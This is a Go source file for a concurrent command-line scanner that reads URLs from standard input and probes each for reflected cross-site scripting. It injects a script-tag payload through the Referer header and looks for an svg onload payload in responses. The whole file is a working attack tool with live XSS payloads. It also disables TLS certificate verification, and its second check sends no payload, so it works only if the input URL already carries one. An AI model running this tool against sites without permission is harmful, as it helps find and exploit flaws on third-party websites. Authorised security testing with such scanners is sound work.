package main

import (
	"crypto/tls"
	"sync"
	"bufio"
	"net/http"
    	"flag"
    	"fmt"
	"os"
	"strings"
	"io/ioutil"
)

func main(){
	fmt.Println("\n")
	fmt.Println("Frequester tool By tojojo v2 !!")
	fmt.Println("Enhanced by KaioGomes")
	fmt.Println("\n")

	colorReset := "\033[0m"
	colorRed := "\033[31m"
    	colorGreen := "\033[32m"

	silent := flag.Bool("silent", false, "display findings only")
	flag.Parse()

	sc := bufio.NewScanner(os.Stdin)

	jobs := make(chan string)
	var wg sync.WaitGroup

	for i:= 0; i < 20; i++{
		wg.Add(1)
		go func(){
			defer wg.Done()
			for domain := range jobs {
			
				transCfg := &http.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ignore expired SSL certificates
				}
			
				client := &http.Client{
					Transport: transCfg,
				}
				
				req, err := http.NewRequest("GET", domain, nil)
				req.Header.Add("Referer", `https://www.google.com/search?hl=en&q=testing'"()&%<acx><ScRiPt>alert(9534)</ScRiPt>`)
				req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0")
				resp, err := client.Do(req)

				if err != nil{
					continue
				}
				
				body, err := ioutil.ReadAll(resp.Body)
				if err != nil {
	      			fmt.Println(err)
	   			}
	   			sb := string(body)

	   			check_result := strings.Contains(sb , "'\"()&%<acx><ScRiPt>alert(9534)</ScRiPt>")
	   			if check_result != false {
	   				fmt.Println(string(colorRed), "[REFERER XSS] - Vulnerable To XSS: ", domain, string(colorReset))
	   			}else{
					if *silent != true {
						fmt.Println(string(colorGreen), "[REFERER XSS] - Not Vulnerable To XSS: ", domain, string(colorReset))	
					}
	   			}


				// ============================================================================================================ //


				transCfg2 := &http.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ignore expired SSL certificates
				}
			
				client2 := &http.Client{
					Transport: transCfg2,
				}
				req2, err2 := http.NewRequest("GET", domain, nil)
				resp2, err2 := client2.Do(req2)

			
				if err2 != nil{
					continue
				}
				
				body2, err2 := ioutil.ReadAll(resp2.Body)
				if err2 != nil {
	      			fmt.Println(err2)
	   			}
	   			sb2 := string(body2)
	   			check_result2 := strings.Contains(sb2 , "\"><svg/onload=alert(1)")
	   			if check_result2 != false {
	   				fmt.Println(string(colorRed), "[QUERY] - Vulnerable To XSS: ", domain, string(colorReset))
	   			}else{
					if *silent != true {
						fmt.Println(string(colorGreen), "[QUERY] - Not Vulnerable To XSS: ", domain, string(colorReset))	
					}
	   			}
			}
   		}()

	}
	for sc.Scan(){
		domain := sc.Text()
		jobs <- domain		
	}
	close(jobs)
	wg.Wait()
}
